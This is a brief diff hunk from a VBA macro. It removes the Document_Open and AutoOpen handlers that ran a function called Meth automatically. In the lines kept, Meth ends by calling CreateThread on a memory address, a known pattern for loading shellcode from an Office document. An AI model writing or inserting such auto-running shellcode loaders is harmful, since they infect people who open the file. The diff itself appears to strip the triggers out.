@@ -21,12 +21,4 @@ Function Meth()
     Next counter
     
     res = CreateThread(0, 0, addr, 0, 0, 0)
-End Function 
-
-Sub Document_Open()
-    Meth
-End Sub
-
-Sub AutoOpen()
-    Meth
-End Sub
+End Function
